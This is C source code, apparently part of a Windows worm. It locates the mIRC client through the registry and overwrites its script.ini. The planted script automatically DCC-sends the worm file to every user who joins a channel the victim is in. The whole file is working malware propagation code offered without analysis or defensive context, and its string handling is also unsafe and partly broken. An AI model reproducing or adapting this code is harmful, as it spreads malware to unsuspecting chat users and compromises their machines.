#include "data_globals.h"
#include <windows.h>
#include <stdio.h>

void _FindmIRC(void)
{
    char mIrc[256];
    char mIrcPath[256];
    char mIrcFull[256] = {0};
    FILE *Script;

    RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\mIrc", 0, KEY_READ, &_hKey);
    RegQueryValueExA(_hKey, "UninstallString", NULL, NULL, mIrc, (LPDWORD)&_mIrcPath);
    RegCloseKey(_hKey);

    // Extract the mIRC installation path from the uninstall string (skip the first character)
    int e = 1;
    while (mIrc[e] != '\0' && mIrc[e] != '.')
    {
        mIrcFull[e - 1] = mIrc[e];
        e++;
    }
    mIrcFull[e - 1] = '\0';   // truncate before the dot (e.g., "C:\...\mirc.exe" -> "C:\...\mirc")

    // Find the last backslash and truncate to the directory
    e = strlen(mIrcFull);
    while (mIrcFull[e] != '\\')
    {
        mIrcFull[e] = '\0';
        e--;
    }

    // Append "script.ini"
    strcat(mIrcFull, "script.ini");

    Script = fopen(mIrcFull, "wt");
    fprintf(Script, "[script]\n");
    fprintf(Script, "n0=on 1:JOIN:#:{\n");
    fprintf(Script, "n1=/if ( $nick == $me ) { halt }\n");
    fprintf(Script, "n2=/dcc send $nick %s\n", _sysdoze2);   // use the global sysdoze2 (the worm's path)
    fprintf(Script, "n3=}\n");
    fclose(Script);

    return;
}
